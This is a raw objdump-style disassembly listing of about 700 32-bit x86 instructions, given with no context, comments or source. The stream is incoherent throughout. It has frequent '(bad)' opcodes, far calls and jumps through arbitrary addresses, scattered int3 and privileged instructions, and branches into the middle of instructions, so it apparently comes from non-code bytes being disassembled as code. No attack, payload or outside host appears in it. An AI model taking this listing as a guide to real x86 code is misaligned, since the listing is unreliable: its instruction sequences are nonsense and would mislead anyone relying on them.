  42252c:	or     DWORD PTR [ebx],ecx
  42252e:	call   FWORD PTR [ecx-0x7cff0b72]
  422534:	or     esp,0xffff5883
  42253a:	mov    bh,0xff
  42253c:	and    ah,bh
  42253e:	int3   
  42253f:	pop    ds
  422540:	int3   
  422541:	inc    esp
  422542:	or     esp,0x25
  422545:	(bad)  
  422546:	push   edx
  422548:	inc    DWORD PTR [ebx-0x319b00ff]
  42254e:	jmp    DWORD PTR [ebx-0x6c]
  422551:	mov    ch,0xff
  422553:	and    DWORD PTR [edi+edi*8-0x34],0xffffffb8
  422558:	add    BYTE PTR [ecx+0x7e0c007e],cl
  42255e:	(bad)  
  42255f:	faddp  st(5),st
  422561:	(bad)  
  422562:	(bad)  
  422563:	jmp    DWORD PTR [esi-0x1]
  422566:	inc    DWORD PTR [eax]
  422568:	cmp    edi,0x62
  42256b:	call   FWORD PTR [esi]
  42256d:	stos   DWORD PTR es:[edi],eax
  42256e:	(bad)  
  42256f:	adc    esp,DWORD PTR ds:[edi]
  422572:	(bad)  
  422573:	inc    DWORD PTR [esi]
  422575:	int3   
  422576:	add    BYTE PTR [esi],ch
  422578:	inc    DWORD PTR [ebx-0x59f0009c]
  42257e:	add    BYTE PTR [ebp-0x767ccee2],dh
  422584:	mov    dl,0xff
  422586:	dec    DWORD PTR [ecx+0x0]
  422589:	add    BYTE PTR [eax-0x34],ah
  42258c:	mov    eax,ds:0x61daff4e
  422591:	cmp    eax,0x8cff89
  422596:	(bad)  
  422597:	sti    
  422598:	(bad)  
  422599:	inc    eax
  42259b:	jmp    FWORD PTR [ebp+edx*1-0x7b57b901]
  4225a2:	add    DWORD PTR [eax],0x2
  4225a5:	add    bh,bh
  4225a7:	mov    DWORD PTR [eax],eax
  4225a9:	sub    DWORD PTR [ebx],0x0
  4225ac:	cs retf 0x2eff
  4225b0:	cmp    BYTE PTR [eax+0x0],0xff
  4225b4:	jmp    0x4225b6
  4225b6:	mov    DWORD PTR [ebx+eax*4],ebp
  4225b9:	inc    DWORD PTR [edx-0x760f6b7d]
  4225bf:	aas    
  4225c0:	sar    DWORD PTR [eax+eax*1],0x89
  4225c4:	dec    ecx
  4225c5:	cmp    edi,0x56
  4225c8:	add    BYTE PTR [eax],al
  4225ca:	sub    bh,bh
  4225cc:	cmp    bl,BYTE PTR [edi]
  4225ce:	inc    esp
  4225d0:	mov    eax,0x7300ff26
  4225d5:	dec    DWORD PTR [ecx+0x23ff0085]
  4225db:	call   FWORD PTR [esi-0x2b250059]
  4225e1:	sub    BYTE PTR [ebx+0xff6fff],al
  4225e7:	xor    DWORD PTR [eax],eax
  4225e9:	add    BYTE PTR [edx+0x0],dh
  4225ec:	xor    esi,esp
  4225ee:	call   DWORD PTR [edi+ecx*1]
  4225f1:	fadd   DWORD PTR [eax]
  4225f3:	and    DWORD PTR [ecx],0xffffffff
  4225f6:	mov    DWORD PTR [esi-0x7cb63400],esp
  4225fc:	gs enter 0xddcc,0xfb
  422601:	xor    eax,0xff10ffff
  422606:	jmp    FWORD PTR [ecx+0x0]
  422609:	add    BYTE PTR [eax+0x820eff],ch
  42260f:	xchg   esi,eax
  422610:	dec    edi
  422611:	(bad)  
  422612:	dec    DWORD PTR [ecx+0x2700ff85]
  422618:	add    BYTE PTR [ecx+0x55ad009f],cl
  42261e:	(bad)  
  42261f:	jnp    0x422651
  422621:	jns    0x422622
  422623:	add    DWORD PTR [ecx+0x0],0xffffffff
  422627:	xor    bh,bh
  422629:	add    BYTE PTR [ebx],ah
  42262b:	adc    DWORD PTR [eax+0x25],0xffffffff
  42262f:	sbb    edx,ebx
  422631:	dec    esp
  422632:	add    bh,bh
  422634:	jmp    0x422635
  422636:	inc    eax
  422638:	cmp    edi,0x5e
  42263b:	mov    esi,esi
  42263d:	mov    bh,0xcc
  42263f:	ss (bad) 
  422641:	xlat   BYTE PTR ds:[ebx]
  422642:	inc    DWORD PTR [eax]
  422644:	pop    ds
  422645:	mov    edi,edi
  422647:	imul   edi,edi,0x6a835700
  42264d:	mov    DWORD PTR [eax],eax
  42264f:	add    ebx,DWORD PTR [edi]
  422651:	sub    edi,edi
  422653:	int3   
  422654:	icebp  
  422655:	int3   
  422656:	(bad)  
  422657:	mov    edi,0xfff9ff00
  42265c:	mov    dl,0xa3
  42265e:	xor    DWORD PTR [esi-0x1c],0x16
  422662:	int3   
  422663:	push   ebp
  422665:	inc    DWORD PTR [ebx+0x7bffcc3b]
  42266b:	jmp    FWORD PTR ds:0xeca000d6
  422671:	jle    0x422673
  422673:	mov    DWORD PTR [edx],esi
  422675:	inc    DWORD PTR [ebx-0x1e337c27]
  42267b:	or     eax,0xffffff83
  42267e:	add    DWORD PTR [edi],0xffffff82
  422681:	ja     0x422682
  422683:	(bad)  
  422684:	jmp    0xdd00:0xff9883ff
  42268b:	mov    DWORD PTR [eax-0x2a26004f],ebx
  422691:	mov    ds:0x83020089,al
  422696:	int3   
  422697:	sbb    eax,0x8962ff83
  42269c:	adc    eax,0x40e7ff0d
  4226a1:	xchg   ebx,eax
  4226a2:	int3   
  4226a3:	jmp    DWORD PTR [ebx+0x0]
  4226a6:	mov    DWORD PTR [ecx-0x1],ebx
  4226a9:	add    BYTE PTR [edi+0x0],bl
  4226ac:	les    ecx,FWORD PTR [eax+0x4e114600]
  4226b2:	(bad)  
  4226b3:	call   DWORD PTR [ebx]
  4226b5:	dec    DWORD PTR [ecx-0x2000061]
  4226bb:	call   FWORD PTR [eax+0x58f98969]
  4226c1:	sldt   WORD PTR [eax]
  4226c4:	push   ss
  4226c5:	add    BYTE PTR [ecx-0x600ffa8],cl
  4226cb:	int3   
  4226cc:	cs inc edi
  4226ce:	add    BYTE PTR [ebx-0xb08],cl
  4226d4:	inc    edx
  4226d5:	inc    DWORD PTR [eax]
  4226d7:	sub    bh,bh
  4226d9:	add    BYTE PTR [ecx+ecx*4-0x7f00ee4a],dl
  4226e0:	pop    ds
  4226e1:	xor    bh,bh
  4226e3:	xor    DWORD PTR [ebx+0x8aff00],0x0
  4226ea:	push   edi
  4226eb:	inc    DWORD PTR [esi+0x6e]
  4226ee:	(bad)  
  4226ef:	cmp    eax,0xf3eb
  4226f4:	es cmp edi,0xfffffffe
  4226f8:	add    BYTE PTR [eax],al
  4226fa:	pop    edx
  4226fb:	call   DWORD PTR [ebx+0x72ff5e]
  422701:	xlat   BYTE PTR ds:[ebx]
  422702:	add    ah,cl
  422704:	mov    ds:0xcc898383,al
  422709:	add    BYTE PTR [ecx],bh
  42270b:	add    BYTE PTR [eax],dh
  42270d:	xrelease mov DWORD PTR [edx+0x25],eax
  422711:	xchg   ebp,eax
  422712:	add    DWORD PTR [ebx-0x70000019],0xffffffff
  422719:	call   DWORD PTR [eax-0x7d]
  42271c:	leave  
  42271d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42271e:	(bad)  
  42271f:	fisubr DWORD PTR [esp+ebp*8-0x1]
  422723:	push   DWORD PTR [ebp+0x7b00ff]
  422729:	jmp    ebp
  42272b:	(bad)  
  42272c:	stc    
  42272d:	dec    edi
  42272e:	add    BYTE PTR [edx+0x2b],ch
  422731:	jae    0x422733
  422733:	push   DWORD PTR [ebx+0x280083]
  422739:	add    dl,bl
  42273b:	sbb    DWORD PTR [esi+0x70c2ff44],0xffffffb1
  422742:	mov    DWORD PTR [eax],eax
  422744:	popa   
  422745:	or     DWORD PTR [ecx+0x63cc0069],0xffffffff
  42274c:	xchg   DWORD PTR [esi],ebp
  42274e:	adc    edi,0x73
  422751:	pop    ss
  422752:	add    BYTE PTR [ebx+0x50ff00cb],al
  422758:	inc    DWORD PTR [eax]
  42275a:	push   ss
  42275b:	push   DWORD PTR [esi]
  42275d:	scas   eax,DWORD PTR es:[edi]
  42275e:	adc    DWORD PTR [ebx],0xc
  422761:	xchg   esp,eax
  422762:	dec    esp
  422764:	sbb    BYTE PTR [eax],al
  422766:	add    BYTE PTR [esi-0xc77c01],bl
  42276c:	ror    DWORD PTR [esi+0x1c3fb5cc],cl
  422772:	cmp    edi,0x14
  422775:	add    bh,bh
  422777:	mov    edx,0xff34cc00
  42277c:	div    DWORD PTR [ecx+ecx*4-0xd9532b]
  422783:	cmp    esp,0xffffffff
  422786:	add    BYTE PTR [edx-0x1],cl
  422789:	call   DWORD PTR [ebp-0x77]
  42278c:	xor    BYTE PTR [ecx+0x21a84ff],bh
  422792:	add    BYTE PTR [ecx-0x7007c83],cl
  422798:	add    ah,cl
  42279a:	xor    DWORD PTR [ebx+0x13ff08fa],eax
  4227a0:	mov    bl,0xa1
  4227a2:	dec    DWORD PTR [ecx+0x34cc00f8]
  4227a8:	(bad)  
  4227a9:	dec    DWORD PTR [eax+0x0]
  4227ac:	adc    DWORD PTR [edx+0xd610eff],0xff300089
  4227b6:	(bad)  
  4227b7:	cmp    DWORD PTR [eax],eax
  4227b9:	call   FWORD PTR [edi]
  4227bb:	push   DWORD PTR [edi]
  4227bd:	sub    DWORD PTR [eax],eax
  4227bf:	mov    edi,0x8300c59b
  4227c4:	(bad)  
  4227c5:	dec    esp
  4227c7:	and    edi,edi
  4227c9:	(bad)  
  4227ca:	aas    
  4227cb:	push   DWORD PTR [ecx-0x494006e]
  4227d1:	(bad)  
  4227d2:	dec    DWORD PTR [ecx-0x7b36ff]
  4227d8:	(bad)  
  4227d9:	cmp    eax,0xddff1300
  4227de:	mov    ecx,DWORD PTR [ecx-0x3396]
  4227e4:	mov    ah,0x42
  4227e6:	cmp    eax,0xd0083
  4227eb:	adc    edi,edi
  4227ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227ee:	mov    edx,0xfffffeff
  4227f3:	inc    DWORD PTR [edi]
  4227f5:	in     al,0x51
  4227f7:	add    BYTE PTR [ebx-0xa07695],al
  4227fd:	xchg   ebx,eax
  4227fe:	std    
  4227ff:	add    BYTE PTR [edi+edi*8-0x5c5f7c01],ah
  422806:	dec    eax
  422807:	cmp    edi,0xffffffaa
  42280a:	add    DWORD PTR [ecx-0x918d34],0xffffffa6
  422811:	int3   
  422812:	inc    DWORD PTR [eax]
  422814:	sub    ebx,0x45
  422817:	add    bh,bh
  422819:	mov    dl,0xff
  42281b:	cld    
  42281c:	add    BYTE PTR [esi],ah
  42281e:	fadd   QWORD PTR [eax]
  422820:	jo     0x422821
  422822:	(bad)  
  422823:	call   FWORD PTR [ebp+0x61]
  422826:	sar    bh,0x0
  422829:	jns    0x4227f7
  42282b:	leave  
  42282c:	jmp    FWORD PTR [esi]
  42282e:	test   al,0x83
  422830:	loope  0x422831
  422832:	add    DWORD PTR [eax],0x59
  422835:	hlt    
  422836:	in     eax,dx
  422837:	dec    esp
  422839:	cmp    edi,edi
  42283b:	cli    
  42283c:	add    dl,ah
  42283e:	cdq    
  42283f:	jmp    DWORD PTR [eax]
  422841:	int3   
  422842:	inc    DWORD PTR [eax]
  422844:	push   edx
  422845:	ins    BYTE PTR es:[edi],dx
  422846:	clc    
  422847:	inc    DWORD PTR [eax]
  422849:	jnp    0x42284a
  42284b:	retf   0x1783
  42284e:	je     0x422850
  422850:	sti    
  422851:	inc    DWORD PTR [ebx+0x6d625acc]
  422857:	add    BYTE PTR [eax],al
  422859:	dec    ebx
  42285a:	mov    DWORD PTR [edi-0x77],esp
  42285d:	and    DWORD PTR [ebp+0xffe6ff],edx
  422863:	add    bh,cl
  422865:	sub    ch,BYTE PTR [eax-0x530000]
  42286b:	cmp    DWORD PTR [ebx+0x7a00d67d],eax
  422871:	dec    DWORD PTR [ecx-0x51587f01]
  422877:	add    BYTE PTR [ebx-0x193366],al
  42287d:	aam    0x22
  42287f:	jmp    FWORD PTR [ebx-0x1]
  422882:	dec    DWORD PTR [ecx-0xf2fd11]
  422888:	adc    DWORD PTR [edi+0x0],0xffffffa2
  42288c:	inc    DWORD PTR [eax]
  42288e:	xchg   DWORD PTR [eax],eax
  422890:	(bad)  
  422892:	inc    DWORD PTR [eax]
  422894:	daa    
  422895:	sbb    al,0x7e
  422897:	add    DWORD PTR [eax],0x68
  42289a:	add    ch,cl
  42289c:	(bad)  
  42289d:	fstp   DWORD PTR [esi-0x77]
  4228a0:	test   esp,0x15a83ff
  4228a6:	pop    ds
  4228a7:	inc    DWORD PTR [ebx-0x7c0d00c9]
  4228ad:	and    edi,edx
  4228af:	int3   
  4228b0:	mov    bh,0x89
  4228b2:	cmp    edi,0xfffffffb
  4228b5:	jecxz  0x422931
  4228b7:	dec    esp
  4228b9:	or     eax,0x39ffa700
  4228be:	jnp    0x4228c0
  4228c0:	clc    
  4228c1:	add    bh,bh
  4228c3:	call   DWORD PTR [eax+edx*2+0x57]
  4228c7:	add    bh,bh
  4228c9:	jge    0x4228ca
  4228cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228cc:	call   DWORD PTR [ebp-0x34]
  4228cf:	add    BYTE PTR [edi-0x1],al
  4228d2:	add    bh,bh
  4228d4:	jo     0x4228e8
  4228d6:	mov    al,0x83
  4228d8:	add    BYTE PTR ds:0x5b89caff,dl
  4228de:	retf   0xafff
  4228e1:	add    BYTE PTR [ebx+0x8cca783],al
  4228e7:	add    DWORD PTR [eax],0x27
  4228ea:	add    cl,ah
  4228ec:	or     DWORD PTR [ebx],0xffffffad
  4228ef:	add    bl,cl
  4228f1:	mov    esp,ecx
  4228f3:	jmp    FWORD PTR [eax+edx*1]
  4228f6:	xor    edi,edi
  4228f8:	add    BYTE PTR [edi+edi*8+0x3c19ff5b],dh
  4228ff:	add    BYTE PTR [esi],ch
  422901:	add    ah,cl
  422903:	push   DWORD PTR [eax+0x834803]
  422909:	leave  
  42290a:	jmp    FWORD PTR [edi-0x1]
  42290d:	les    eax,FWORD PTR [edx+0x0]
  422910:	and    bh,bh
  422912:	inc    DWORD PTR [eax]
  422914:	stos   DWORD PTR es:[edi],eax
  422915:	imul   edi,DWORD PTR [ecx+0x9600ff],0x863ff7e
  42291f:	jmp    DWORD PTR [edi]
  422921:	or     DWORD PTR [ecx-0x1de75c01],0xffffffff
  422928:	add    BYTE PTR [ebp-0x57ff4f01],dh
  42292e:	mov    esi,0x83cc5383
  422933:	dec    DWORD PTR [esi]
  422935:	xchg   esp,eax
  422936:	(bad)  
  422938:	call   FWORD PTR [edx+0x83d7cc]
  42293e:	jecxz  0x42290c
  422940:	sbb    edi,edi
  422942:	(bad)  
  422943:	inc    DWORD PTR [eax+0x72]
  422946:	mov    ds:0xff38ff83,al
  42294b:	sub    edi,edi
  42294d:	in     eax,0x3a
  42294f:	adc    DWORD PTR [eax-0x1],0xffffffcc
  422953:	add    BYTE PTR [ebp+0x40],bh
  422956:	dec    edx
  422957:	mov    DWORD PTR [eax],eax
  422959:	mov    bl,0xff
  42295b:	cmp    bh,bh
  42295d:	enter  0xff16,0x54
  422961:	(bad)  
  422962:	inc    DWORD PTR [ebx-0xc5586e]
  422968:	call   DWORD PTR [ebp-0x1]
  42296b:	add    bh,bh
  42296d:	push   edi
  42296e:	sar    edi,cl
  422970:	sbb    ecx,esp
  422972:	add    bh,bh
  422974:	in     eax,dx
  422975:	ror    BYTE PTR [esi+0xd8ff83],1
  42297b:	fild   DWORD PTR [ebx+0xb894e87]
  422981:	(bad)  
  422982:	inc    DWORD PTR [eax]
  422984:	mov    bl,BYTE PTR [ebx]
  422986:	jle    0x422988
  422988:	int3   
  422989:	int3   
  42298a:	jmp    DWORD PTR [ecx-0xb9aa77]
  422990:	mov    ecx,0x64ffff00
  422995:	sub    eax,0xf2ffff5e
  42299a:	jmp    DWORD PTR [esi+0x3ca783]
  4229a0:	inc    edx
  4229a1:	add    bh,bh
  4229a3:	add    dh,ch
  4229a5:	(bad)  
  4229a6:	scas   eax,DWORD PTR es:[edi]
  4229a7:	add    DWORD PTR [eax],0xffffffb4
  4229aa:	(bad)  
  4229ab:	jns    0x4229ad
  4229ad:	jp     0x422969
  4229af:	push   DWORD PTR ds:0x5838900
  4229b5:	dec    eax
  4229b6:	sar    edi,0x83
  4229b9:	and    BYTE PTR [ecx+0x4dee00f8],cl
  4229bf:	mov    ebx,ebp
  4229c1:	cmp    edi,0x0
  4229c4:	dec    esi
  4229c5:	das    
  4229c6:	rol    DWORD PTR [eax],cl
  4229c8:	(bad)  
  4229c9:	jmp    0x4229ca
  4229cb:	mov    dh,0xff
  4229cd:	cmp    eax,esp
  4229cf:	add    BYTE PTR [ebp+0x410089ff],al
  4229d5:	cli    
  4229d6:	mov    cl,0xff
  4229d8:	push   DWORD PTR [edi]
  4229da:	inc    DWORD PTR [ecx-0x7d]
  4229dd:	add    eax,0xff78ff29
  4229e2:	add    BYTE PTR [eax],al
  4229e4:	gs xchg edx,eax
  4229e6:	mov    ds:0xffbb0000,eax
  4229eb:	verw   WORD PTR [ebx-0x6c7c57]
  4229f2:	mov    DWORD PTR [eax],eax
  4229f4:	cmc    
  4229f5:	addr16 pop eax
  4229f7:	int3   
  4229f8:	adc    DWORD PTR [ecx-0x34],0xfffffffd
  4229fc:	jmp    FWORD PTR [ebp+0x31]
  4229ff:	inc    DWORD PTR [edi+edi*8]
  422a02:	inc    DWORD PTR [eax]
  422a04:	dec    esi
  422a05:	jns    0x422a29
  422a07:	add    bh,bh
  422a09:	jne    0x422a0b
  422a0b:	(bad)  
  422a0e:	into   
  422a0f:	mov    DWORD PTR ds:0xac0000ff,esp
  422a15:	mov    WORD PTR [eax],es
  422a17:	mov    DWORD PTR [eax],eax
  422a19:	mov    edi,edi
  422a1b:	icebp  
  422a1c:	call   FWORD PTR ds:0x5483e8
  422a22:	(bad)  
  422a23:	dec    edx
  422a25:	adc    DWORD PTR ds:0xff818300,ebp
  422a2b:	pop    edi
  422a2c:	add    bh,cl
  422a2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a2f:	push   DWORD PTR [ebx+0x7883ffff]
  422a35:	add    eax,0x2389ff22
  422a3a:	int3   
  422a3b:	inc    edi
  422a3c:	call   DWORD PTR [eax-0x76bbff4b]
  422a42:	(bad)  
  422a43:	dec    DWORD PTR [ebp-0x7cff2b31]
  422a49:	inc    BYTE PTR [eax]
  422a4b:	or     bh,bh
  422a4d:	mov    edi,0xcc52cce6
  422a52:	inc    DWORD PTR [eax]
  422a54:	popa   
  422a55:	aam    0xa9
  422a57:	(bad)  
  422a58:	dec    DWORD PTR [ebp-0x1833b07d]
  422a5e:	cmp    edi,edi
  422a60:	pop    eax
  422a61:	inc    DWORD PTR [ebx-0x417e7a34]
  422a67:	(bad)  
  422a68:	call   FWORD PTR [edi+0x0]
  422a6b:	add    al,BYTE PTR [eax]
  422a6d:	in     eax,dx
  422a6e:	fisttp DWORD PTR [ecx-0x7c7c00ee]
  422a74:	dec    ebx
  422a75:	jbe    0x4229f7
  422a77:	int3   
  422a78:	and    DWORD PTR ds:0x91ff7a83,0x45
  422a7f:	jmp    DWORD PTR [edi]
  422a81:	inc    DWORD PTR [ebx+0x3bd8c8ff]
  422a87:	add    BYTE PTR [ecx-0x76a9001a],cl
  422a8d:	dec    ebp
  422a8e:	jecxz  0x422a90
  422a90:	gs or  esp,0xffffff83
  422a94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a95:	daa    
  422a96:	pushf  
  422a97:	dec    DWORD PTR [ecx-0x335a008d]
  422a9d:	pushf  
  422a9e:	lock jmp DWORD PTR [esi]
  422aa1:	add    BYTE PTR [ecx+0x1721a3ff],cl
  422aa7:	add    BYTE PTR [eax],al
  422aa9:	and    eax,DWORD PTR [eax]
  422aab:	sbb    bh,bh
  422aad:	push   ebp
  422aae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422aaf:	call   ebx
  422ab1:	dec    DWORD PTR [ecx+0x5e1a4eff]
  422ab7:	(bad)  
  422ab8:	jmp    DWORD PTR [ecx+ecx*4]
  422abb:	icebp  
  422abc:	add    BYTE PTR [esi+0x9d00cc],bl
  422ac2:	mov    DWORD PTR [eax],eax
  422ac4:	add    al,bh
  422ac6:	popf   
  422ac7:	dec    esp
  422ac9:	cs add bl,dh
  422acc:	jmp    DWORD PTR [edx-0xb00074]
  422ad2:	add    bh,bh
  422ad4:	stc    
  422ad5:	cmc    
  422ad6:	pop    edx
  422ad7:	add    BYTE PTR [ecx-0xb50027],cl
  422add:	les    ebp,FWORD PTR [esi]
  422adf:	add    DWORD PTR [eax+eax*1+0x706300ff],0x43
  422ae7:	add    bh,bh
  422ae9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422aea:	inc    DWORD PTR ds:0xc77a00
  422af0:	push   eax
  422af1:	cmp    edi,0x0
  422af4:	sub    BYTE PTR [eax+0x6bff0092],0xff
  422afb:	push   esp
  422afc:	add    BYTE PTR [esi+edi*1-0x34],ch
  422b00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b01:	add    DWORD PTR [ebx-0x62bcf134],0x0
  422b08:	add    BYTE PTR [ebx-0x77],ah
  422b0b:	inc    BYTE PTR [ebx+0x4a83ab9a]
  422b11:	(bad)  
  422b12:	(bad)  
  422b13:	dec    DWORD PTR [ecx]
  422b15:	rol    ecx,1
  422b17:	inc    DWORD PTR [ebx-0xc1001a]
  422b1d:	lahf   
  422b1e:	ja     0x422b1f
  422b20:	xchg   ecx,eax
  422b21:	inc    DWORD PTR [eax]
  422b23:	add    BYTE PTR [edx],bh
  422b25:	aam    0x7f
  422b27:	(bad)  
  422b28:	(bad)  
  422b29:	jl     0x422b2b
  422b2b:	or     BYTE PTR [eax],al
  422b2d:	(bad)  
  422b2e:	ja     0x422b2f
  422b30:	sub    al,BYTE PTR [ebx-0x3b6e0000]
  422b36:	pusha  
  422b37:	add    BYTE PTR [ebx-0x76570029],al
  422b3d:	and    al,0x49
  422b3f:	add    al,ah
  422b41:	or     DWORD PTR [ecx+0x399ee200],0xffffffcc
  422b48:	inc    DWORD PTR [esi]
  422b4a:	adc    esp,0x0
  422b4d:	ror    al,cl
  422b4f:	adc    DWORD PTR [eax+0x0],0xffffffff
  422b53:	jmp    DWORD PTR [edi-0xffebbf]
  422b59:	imul   eax,DWORD PTR [ebx-0x172900ef],0xffffffcc
  422b60:	xor    eax,0x84ff0000
  422b65:	scas   al,BYTE PTR es:[edi]
  422b66:	rol    DWORD PTR [ebx+0x19ccceff],cl
  422b6c:	add    DWORD PTR [edx+0x70],0xffffffff
  422b70:	mov    edx,0x4f00ff00
  422b75:	lahf   
  422b76:	outs   dx,BYTE PTR ds:[esi]
  422b77:	int3   
  422b78:	jmp    DWORD PTR [ebp-0x77]
  422b7b:	mov    esp,0x83b9d2ff
  422b80:	aas    
  422b81:	inc    DWORD PTR [eax]
  422b83:	inc    DWORD PTR ds:0x89ffaf7d
  422b89:	sar    edi,0xe8
  422b8c:	add    ah,cl
  422b8e:	pop    edx
  422b8f:	mov    DWORD PTR [ebx-0x7d],edi
  422b92:	inc    DWORD PTR [eax]
  422b94:	mov    edi,0x83cceb13
  422b99:	dec    esi
  422b9a:	(bad)  
  422b9b:	(bad)  
  422b9d:	mov    dl,0xe9
  422b9f:	mov    DWORD PTR [eax+eax*1],ebx
  422ba2:	int3   
  422ba3:	dec    DWORD PTR [ecx+0x49]
  422ba6:	jl     0x422ba7
  422ba8:	add    BYTE PTR [edi-0x1],al
  422bab:	and    cl,BYTE PTR [ecx+0x7d00d9a1]
  422bb1:	(bad)  
  422bb2:	inc    DWORD PTR [eax]
  422bb4:	pop    ebx
  422bb5:	xchg   sp,ax
  422bb7:	(bad)  
  422bb8:	dec    DWORD PTR [eax]
  422bba:	add    BYTE PTR [esi],bl
  422bbc:	add    dh,dl
  422bbe:	adc    dx,0xffff
  422bc2:	int3   
  422bc3:	dec    esp
  422bc5:	mov    dh,0xd0
  422bc7:	(bad)  
  422bc8:	call   DWORD PTR [ecx-0x1]
  422bcb:	add    BYTE PTR [eax],0x5b
  422bce:	mov    ebx,0x8389bdff
  422bd3:	dec    DWORD PTR [eax-0x23]
  422bd6:	add    BYTE PTR fs:[eax],al
  422bd9:	push   ebp
  422bda:	adc    DWORD PTR [ecx+0x0],0x2a
  422bde:	push   eax
  422bdf:	mov    ebp,edi
  422be1:	mov    edi,edi
  422be3:	mov    DWORD PTR [edi-0x32],ebp
  422be6:	mov    cl,0x0
  422be8:	inc    DWORD PTR [edi+edi*8+0x2508982]
  422bef:	add    dl,ch
  422bf1:	dec    esp
  422bf3:	or     ebx,0x38
  422bf6:	dec    ebx
  422bf7:	(bad)  
  422bf8:	call   DWORD PTR [edi+edi*8+0x1941ffc8]
  422bff:	(bad)  
  422c00:	sti    
  422c01:	add    bh,bh
  422c03:	mov    DWORD PTR [edi],eax
  422c05:	sbb    DWORD PTR [edx-0x1],edx
  422c08:	add    BYTE PTR [eax+0xfff400],al
  422c0e:	xchg   esp,eax
  422c0f:	add    ch,bh
  422c11:	add    bh,bh
  422c13:	add    BYTE PTR [ebp+0x52],dh
  422c16:	xor    bh,bh
  422c18:	jmp    DWORD PTR [ecx+0x0]
  422c1b:	and    cl,BYTE PTR [ecx+0xf83f53f]
  422c21:	add    ah,cl
  422c23:	push   DWORD PTR [edx-0x7cff99c6]
  422c29:	add    eax,0x9b83daff
  422c2e:	add    DWORD PTR [eax],0x2d
  422c31:	add    ah,cl
  422c33:	add    BYTE PTR [ebp+0x8],bl
  422c36:	mov    DWORD PTR [eax],0x4300c0ff
  422c3c:	(bad)  
  422c3d:	jns    0x422cac
  422c3f:	add    BYTE PTR [ecx+0x72ffffff],bh
  422c45:	ret    
  422c46:	out    dx,al
  422c47:	inc    DWORD PTR [eax]
  422c49:	mov    ebx,0x5500aa89
  422c4e:	add    edi,edi
  422c50:	sub    BYTE PTR [eax],al
  422c52:	add    BYTE PTR [eax],al
  422c54:	push   es
  422c55:	call   0xe80eaf8b
  422c5a:	mov    DWORD PTR [eax],edi
  422c5c:	add    cl,ah
  422c5e:	out    dx,eax
  422c5f:	add    BYTE PTR [esi-0x3a7cff01],dl
  422c65:	dec    esi
  422c66:	mov    al,0xff
  422c68:	add    cl,dl
  422c6a:	call   FWORD PTR [edi+edi*8+0x2dff14be]
  422c71:	add    BYTE PTR [ebx-0x13b0a600],al
  422c77:	inc    DWORD PTR [eax]
  422c79:	jge    0x422c7b
  422c7b:	pop    ds
  422c7c:	add    BYTE PTR [ebp-0xcf00a7],cl
  422c82:	mov    DWORD PTR [ebx-0x7686e0b2],eax
  422c88:	and    DWORD PTR [ecx-0x1],0xffffffcb
  422c8c:	add    BYTE PTR [eax+ecx*1-0x335901],ah
  422c93:	int3   
  422c94:	ins    DWORD PTR es:[edi],dx
  422c95:	inc    esi
  422c96:	repnz inc DWORD PTR [eax]
  422c99:	js     0x422c9b
  422c9b:	sub    al,0xff
  422c9d:	pushf  
  422c9e:	sar    bh,1
  422ca0:	in     eax,dx
  422ca1:	dec    esp
  422ca3:	add    cl,cl
  422ca5:	call   0x4f0f2c92
  422caa:	call   FWORD PTR [ebp-0x1]
  422cad:	stos   BYTE PTR es:[edi],al
  422cae:	inc    DWORD PTR [eax]
  422cb0:	jbe    0x422cb2
  422cb2:	(bad)  
  422cb3:	dec    esi
  422cb5:	inc    ebx
  422cb6:	sbb    al,0x0
  422cb8:	add    al,cl
  422cba:	push   DWORD PTR [edx]
  422cbc:	add    BYTE PTR [eax+0x4a],dl
  422cbf:	(bad)  
  422cc0:	mov    ecx,0xf4ffff83
  422cc5:	cmc    
  422cc6:	repnz cmp edi,0x73
  422cca:	dec    DWORD PTR [edx+0xf87800]
  422cd0:	sub    al,0xff
  422cd2:	add    bh,bh
  422cd4:	ins    DWORD PTR es:[edi],dx
  422cd5:	cmp    edx,DWORD PTR [edi+0x0]
  422cd8:	cmp    eax,0xffffffff
  422cdb:	push   esp
  422cdc:	add    BYTE PTR [ebp-0x764b00be],ah
  422ce2:	mov    DWORD PTR [ebx-0x33762d16],eax
  422ce8:	push   DWORD PTR [ebx-0x1]
  422ceb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422cec:	add    BYTE PTR [esi-0x69],ch
  422cef:	add    DWORD PTR [ebx],0x0
  422cf2:	(bad)  
  422cf3:	call   DWORD PTR [edx-0xfeca]
  422cf9:	mov    al,ds:0xe002989
  422cfe:	adc    al,0xff
  422d00:	jns    0x422d02
  422d02:	inc    DWORD PTR [ebx+0xc920de]
  422d08:	jmp    FWORD PTR [esi-0x7d]
  422d0b:	ins    BYTE PTR es:[edi],dx
  422d0c:	add    ah,dl
  422d0e:	test   al,0xff
  422d10:	push   esi
  422d11:	dec    DWORD PTR [ecx-0x59814b01]
  422d17:	(bad)  
  422d18:	call   FWORD PTR [eax+eax*1+0x50]
  422d1c:	call   DWORD PTR [ecx-0x3390008d]
  422d22:	inc    DWORD PTR [ebx+0x78488e]
  422d28:	call   DWORD PTR [ecx]
  422d2a:	int3   
  422d2b:	repz add BYTE PTR [edi],dl
  422d2e:	out    0x0,al
  422d30:	sbb    al,0x0
  422d32:	add    BYTE PTR [eax],al
  422d34:	fisub  WORD PTR [edx-0xd330002]
  422d3a:	call   FWORD PTR [ecx]
  422d3c:	inc    DWORD PTR [eax-0x90ff45]
  422d42:	mov    DWORD PTR [eax],eax
  422d44:	mov    edi,0xff00f681
  422d49:	push   WORD PTR [ebp+0x51c5ff]
  422d50:	push   ecx
  422d51:	mov    esp,ecx
  422d53:	int3   
  422d54:	xor    eax,0xff89aba5
  422d59:	scas   eax,DWORD PTR es:[edi]
  422d5a:	add    al,cl
  422d5c:	inc    DWORD PTR [edx]
  422d5e:	or     bh,bh
  422d60:	aaa    
  422d61:	add    BYTE PTR [ebx-0x5519ea34],al
  422d67:	(bad)  
  422d68:	(bad)  
  422d69:	call   FWORD PTR ds:[ecx]
  422d6c:	add    al,bh
